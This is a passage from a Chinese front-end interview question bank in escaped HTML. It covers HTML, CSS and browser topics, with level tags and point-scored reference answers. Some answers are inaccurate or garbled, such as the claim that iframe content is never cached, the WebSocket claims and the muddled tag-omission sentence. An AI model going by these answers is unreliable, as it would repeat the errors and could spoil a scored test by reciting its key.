中的元素、变量、样式是独立的；</li>\\n<li>并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；</li>\\n<li>灵活性强：可以引入各类网站，即使跨域；</li>\\n</ul>\\n</li>\\n<li><strong>2：</strong> 缺点：<ul>\\n<li>不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；</li>\\n<li>性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；</li>\\n<li>通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>8. 谈谈你对 Web 标准以及 W3C 的理解和认识</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。</li>\\n<li><strong>1：</strong> 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。</li>\\n</ul>\\n<h2>9. 什么是严格模式与混杂模式？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。</li>\\n</ul>\\n<h2>10. script、script async 和 script defer 的区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>2：</strong> script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  </p>\\n<p>async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  </p>\\n<p>defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。</p>\\n</li>\\n</ul>\\n<h2>11. 浏览器乱码的原因是什么？如何解决？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：原因</strong>\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  </p>\\n<p>  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  </p>\\n<p>  3.浏览器不能自动检测网页编码，造成网页乱码。</p>\\n</li>\\n<li><p><strong>1：解决办法</strong>\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  </p>\\n<p>  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;</p>\\n</li>\\n</ul>\\n<h2>12. CSS中 link 和@import 的区别是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong>   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  </p>\\n<p>import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  </p>\\n<p>link方式的样式的权重 高于@import的权重。</p>\\n</li>\\n</ul>\\n<h2>13. CSS中 transition和animation的区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。</li>\\n</ul>\\n<h2>14. 什么是 DOCTYPE， 有何作用？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。</li>\\n</ul>\\n<h2>15. HTML5 中的Web Worker是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 基本概念：</p>\\n<ul>\\n<li>运行在后台的JavaScript</li>\\n<li>独立于主线程</li>\\n<li>不会阻塞页面渲染</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 主要特点：</p>\\n<ul>\\n<li>多线程执行</li>\\n<li>消息通信机制</li>\\n<li>独立的运行环境</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用限制：</p>\\n<ul>\\n<li>无法访问DOM</li>\\n<li>无法访问window对象</li>\\n<li>无法访问document对象</li>\\n<li>有同源限制</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 适用场景：</p>\\n<ul>\\n<li>复杂数据处理</li>\\n<li>大量计算</li>\\n<li>图像处理</li>\\n<li>数据加密</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>16. HTML5 中的WebSocket是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 基本概念：</p>\\n<ul>\\n<li>基于TCP的全双工通信协议</li>\\n<li>服务器可以主动推送数据</li>\\n<li>建立在HTTP协议之上</li>\\n<li>使用ws://或wss://作为协议前缀</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 主要特点：</p>\\n<ul>\\n<li>持久连接</li>\\n<li>全双工通信</li>\\n<li>数据格式轻量</li>\\n<li>更好的实时性</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 与HTTP的区别：</p>\\n<ul>\\n<li>不需要频繁建立连接</li>\\n<li>服务器可以主动推送</li>\\n<li>更低的通信开销</li>\\n<li>无同源限制</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 应用场景：</p>\\n<ul>\\n<li>实时聊天</li>\\n<li>游戏通信</li>\\n<li>实时数据展示</li>\\n<li>协同编辑</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>17. 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。</li>\\n<li><strong>1：</strong>  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。</li>\\n<li><strong>1：</strong>  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。</li>\\n<li><strong>1：</strong>  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。</li>\\n<li><strong>1：</strong>  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。</li>\\n</ul>\\n<h2>18. 行内元素和块级元素的区别是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如<code>&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;</code>等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如<code>&lt;span&gt;、&lt;a&gt;、&lt;img&gt;</code>等。</li>\\n<li><strong>1：</strong>  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。</li>\\n<li><strong>1：</strong>  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过<code>&lt;a&gt;</code>标签比较特殊，理论上可以包含大部分元素。</li>\\n</ul>\\n<h2>19. 请解释 meta 标签的作用，并列举几个常见的 meta 标签及其功能</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。</li>\\n<li><strong>1：</strong>  <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。</li>\\n<li><strong>1：</strong>  <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：主要用于移动端开发，设置视口的属性，<code>width=device-width</code> 表示视口\\n宽度等于设备的屏幕宽度，<code>initial-scale=1.0</code> 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。</li>\\n<li><strong>1：</strong>  <code>&lt;meta name=&quot;description&quot; content=&quot;这是一个关于 HTML 面试题的页面描述&quot;&gt;</code>：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。</li>\\n<li><strong>1：</strong>  <code>&lt;meta name=&quot;keywords&quot; content=&quot;HTML, 面试题, 网页开发&quot;&gt;</code>：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。</li>\\n</ul>\\n<h2>20. 请阐述 HTML5 中 <code>&lt;template&gt;</code> 元素的特点和优势</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  特点：<code>&lt;template&gt;</code> 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。</li>\\n<li><strong>1：</strong>  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。</li>\\n</ul>\\n<h2>21. Canvas 和 SVG 有何区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Canvas 是基于像素的绘图，适用于动画、游戏、图表等，特别是需要高性能绘制的场景。</p>\\n<p>SVG 是基于矢量的绘图，适用于图标、复杂图形、可缩放的图形等。</p>\\n<h2>22. png、jpg、gif这些图片格式解释一下，分别什么时候用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标</p>\\n<p>jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片</p>\\n<p>gif：一般是做动图</p>\\n<p>webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好</p>\\n<h2>23. 什么是 优雅降级、渐进增强？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>优雅降级（Graceful Degradation）和渐进增强（Progressive Enhancement）是Web开发中用于提高网站或应用在不同环境和设备上的适应性的两种策略。</p>\\n<p>优雅降级是一种设计策略，它首先构建完整的功能和复杂的用户体验，然后针对那些不支持这些功能的浏览器或设备进行简化或降级处理，以确保基本的可用性。优雅降级的特点是从一个功能丰富的版本开始，并试图通过减少功能来适应不同的环境，关注的是保持核心功能的可用性，即使在低版本浏览器或设备上。</p>\\n<p>渐进增强则是从最基本的、可访问的版本开始构建网站或应用，然后逐渐添加更高级的功能和效果，以提供更好的用户体验。渐进增强的特点是从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要，关注的是为所有用户提供基本功能，并为高级用户提供额外体验。</p>\\n<h2>24. img的srcset属性的作⽤？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>响应式页面中经常用到根据屏幕密度设置不同的图片。这时就用到了 img 标签的srcset属性。srcset属性用于设置不同屏幕密度下，img 会自动加载不同的图片。用法如下：</p>\\n<pre><code class=\\"language-html\\">&lt;img src=&quot;image-128.png&quot; srcset=&quot;image-256.png 2x&quot; /&gt;\\n</code></pre>\\n<h2>25. 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>行内元素有：a b span img input select strong；</p>\\n<p>块级元素有：div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p；</p>\\n<p>空元素，即没有内容的HTML元素。空元素是在开始标签中关闭的，也就是空元素没有闭合标签：</p>\\n<p>常见的有：br hr img input link meta</p>\\n<h2>26. 说一下 web worker</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>在 HTML 页面中，如果在执行脚本时，页面的状态是不可相应的，直到脚本执行完成后，页面才变成可相应。web worker 是运行在后台的 js，独立于其他脚本，不会影响页面的性能。 并且通过 postMessage 将结果回传到主线程。这样在进行复杂操作的时候，就不会阻塞主线程了。</p>\\n<p>如何创建 web worker：</p>\\n<p>检测浏览器对于 web worker 的支持性</p>\\n<p>创建 web worker 文件（js，回传函数等）</p>\\n<p>创建 web worker 对象</p>\\n<h2>27. HTML5的离线储存怎么使用，它的工作原理是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>离线存储指的是：在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。</p>\\n<p>**原理：**HTML5的离线存储是基于一个新建的 .appcache 文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示.</p>\\n<p>使用方法： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部加入 manifest 属性：</p>\\n<pre><code class=\\"language-html\\">\\n  &lt;html lang=&quot;en&quot; manifest=&quot;index.manifest&quot;&gt;\\n</code></pre>\\n<p>（2）在 cache.manifest 文件中编写需要离线存储的资源：</p>\\n<pre><code class=\\"language-html\\">\\n  CACHE MANIFEST\\n    #v0.11\\n    CACHE:\\n    js/app.js\\n    css/style.css\\n    NETWORK:\\n    resourse/logo.png\\n    FALLBACK:\\n    / /offline.html\\n</code></pre>\\n<p>CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把页面自身也列出来。</p>\\n<p>NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。</p>\\n<p>FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。</p>\\n<p>（3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。</p>\\n<h2>28. 浏览器是如何对 HTML5 的离线储存资源进行管理和加载？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>在线的情况下，浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件，如果是第一次访问页面 ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。如果已经访问过页面并且资源已经进行离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，就会重新下载文件中的资源并进行离线存储。</p>\\n<p>离线的情况下，浏览器会直接使用离线存储的资源。</p>\\n<h2>29. label 的作用是什么？如何使用</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>label标签来定义表单控件的关系：当用户选择label标签时，浏览器会自动将焦点转到和label标签相关的表单控件上。</p>\\n<pre><code class=\\"language-html\\">\\n&lt;label for=&quot;mobile&quot;&gt;Number:&lt;/label&gt;\\n&lt;input type=&quot;text&quot; id=&quot;mobile&quot;/&gt;\\n</code></pre>\\n<h2>30. head 标签有什么作用，其中什么标签必不可少？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>标签用于定义文档的头部，它是所有头部元素的容器。 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等。</p>\\n<p>文档的头部描述了文档的各种属性和信息，包括文档的标题、在 Web 中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。</p>\\n<p>下面这些标签可用在 head 部分：base, link 等。</p>\\n<h2>31. 说一下 HTML5 drag API</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>dragstart：事件主体是被拖放元素，在开始拖放被拖放元素时触发。</p>\\n<p>darg：事件主体是被拖放元素，在正在拖放被拖放元素时触发。</p>\\n<p>dragenter：事件主体是目标元素，在被拖放元素进入某元素时触发。</p>\\n<p>dragover：事件主体是目标元素，在被拖放在某元素内移动时触发。</p>\\n<p>dragleave：事件主体是目标元素，在被拖放元素移出目标元素是触发。</p>\\n<p>drop：事件主体是目标元素，在目标元素完全接受被拖放元素时触发。</p>\\n<p>dragend：事件主体是被拖放元素，在整个拖放操作结束时触发。</p>\\n<h2>32. Quirks（怪癖）模式是什么？它和Standards（标准）有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>页面如果写了DTD，就意味着这个页面采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式，这就是Quirks模式，有时候也叫怪癖模式、诡异模式、怪异模式。</p>\\n<p>区别：总体会有布局、样式解析、脚本执行三个方面区别，这里列举一些比较常见的区别：</p>\\n<ul>\\n<li><p>盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border</p>\\n</li>\\n<li><p>设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效</p>\\n</li>\\n<li><p>用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效</p>\\n</li>\\n<li><p>设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的</p>\\n</li>\\n</ul>\\n<h2>33. meta viewport 是做什么用的，怎么写？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Viewport，适配移动端，可以控制视口的大小和比例：</p>\\n<pre><code class=\\"language-html\\">\\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;\\n</code></pre>\\n<p>width viewport ：宽度(数值/device-width)</p>\\n<p>height viewport ：高度(数值/device-height)</p>\\n<p>initial-scale ：初始缩放比例</p>\\n<p>maximum-scale ：最大缩放比例</p>\\n<p>minimum-scale ：最小缩放比例</p>\\n<h2>34. HTML、XML、XHTML 的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；</p>\\n</li>\\n<li><p>XML：可扩展标记语言，是语法较为严格、严格的标记语言；</p>\\n</li>\\n<li><p>XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；</p>\\n</li>\\n</ul>\\n<h2>35. 什么是HTML5以及和HTML的区别是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>HTML5是HTML的新标准，其主要目标是无需任何额外的插件如Flash、Silverlight等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。</p>\\n<p>HTML5是由万维网联盟（W3C）和Web Hypertext Application Technology Working Group 合作创建的HTML新版本。</p>\\n<p>从文档声明类型上看：</p>\\n<ul>\\n<li>HTML是很长的一段代码，很难记住。如下代码：</li>\\n</ul>\\n<pre><code class=\\"language-html\\">\\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;\\nhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;\\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\\n\\n\\n- HTML5却只有简简单单的声明，方便记忆。如下：\\n\\n```html\\n\\n&lt;!DOCTYPE html&gt;\\n</code></pre>\\n<p>从语法规则上看：</p>\\n<ul>\\n<li><p>HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；</p>\\n</li>\\n<li><p>HTML5允许省略标签，比如<code>&lt;img&gt;</code>标签的<code>&lt;img&gt;</code>、<code>&lt;br&gt;</code>标签的<code>&lt;br&gt;</code>、<code>&lt;input&gt;</code>标签的<code>&lt;input&gt;</code>等，这种情况下，标签的结束标志不是必需的；</p>\\n</li>\\n</ul>\\n<h2>36. HTML5 为什么只需要写 docType</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>这是因为HTML5不基于SGML，因此不需要对DTD进行引用，但是需要DOCTYPE来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。</p>\\n<h2>37. 支持HTML5的浏览器有哪些</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>现在几乎所有现有的浏览器都支持HTML5，例如Chrome, Opera, Safari, IE, 火狐等；</p>\\n<h2>38. table的作用以及其优缺点</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>作用</p>\\n<ul>\\n<li><p>可用于布局（已过时）；</p>\\n</li>\\n<li><p>用于显示批量数据；</p>\\n</li>\\n</ul>\\n<p>优点</p>\\n<p>在某些场合，使用Table是100%的适合、恰当和正确。比如，用table做表格是完全正确的；</p>\\n<p>缺点</p>\\n<p>Table要比其它html标记占更多的字节，会导致延迟下载时间，占用服务器更多的流量资源；</p>\\n<p>Table会阻挡浏览器渲染引擎的渲染顺序，这会导致延迟页面的生成速度，让用户等待更久的时间；</p>\\n<p>灵活性差，比如要通多td才能设置tr的border属性；</p>\\n<p>代码臃肿，当在table中套用table的时候，阅读代码会显得异常混乱；</p>\\n<p>混乱的colspan与rowspan，用来布局时，频繁使用他们会造成整个文档顺序混乱；</p>\\n<p>深层的嵌套，导致搜索引擎读取困难，同时还很大程度上增加了代码冗余；</p>\\n<p>不够语义。</p>\\n<h2>39. HTML元素如何体现其嵌套关系</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>块级元素可以包含行内元素；</p>\\n<p>块级元素不一定能包含块级元素；</p>\\n<p>行内元素一般不能包含块级元素（a元素例外）</p>\\n<h2>40. 几种Doctype文档类型</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。</p>\\n<p>HTML 4.01 规定了三种文档类型：分别是Strict、Transitional 以及 Frameset；</p>\\n<p>XHTML 1.0 规定了三种 XML 文档类型：分别是Strict、Transitional 以及 Frameset；</p>\\n<p>Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页；</p>\\n<p>Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。</p>\\n<h2>41. 什么是前端的结构，样式和行为相分离？以及分离的好处是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>结构，样式和行为分离</p>\\n<p>若是将前端比作一个人来举例子，结构（HTML）就相当于是人体的“骨架”，样式就相当于人体的“装饰”，例如衣服，首饰等；行为就相当于人做出的一系列“动作”。\\n在结构，样式和行为分离，就是将三者分离开，各自负责各自的内容，各部分可以通过引用进行使用。\\n在分离的基础上，我们需要做到代码的：精简， 重用， 有序。</p>\\n<p>分离的好处:</p>\\n<p>代码分离，利于团队的开发和后期的维护；</p>\\n<p>减少维护成本，提高可读性和更好的兼容性；</p>\\n<h2>42. 如何对网站的文件和资源进行优化</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>文件合并（目的是减少http请求）；</p>\\n<p>文件压缩 （目的是直接减少文件下载的体积）；</p>\\n<p>使用缓存；</p>\\n<p>使用cdn托管资源；</p>\\n<p>gizp压缩需要的js和css文件；</p>\\n<p>反向链接，网站外链接优化；</p>\\n<p>meta标签优化（title, description, keywords）,heading标签的优化,alt优化；</p>\\n<h2>43. Html5中datalist是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 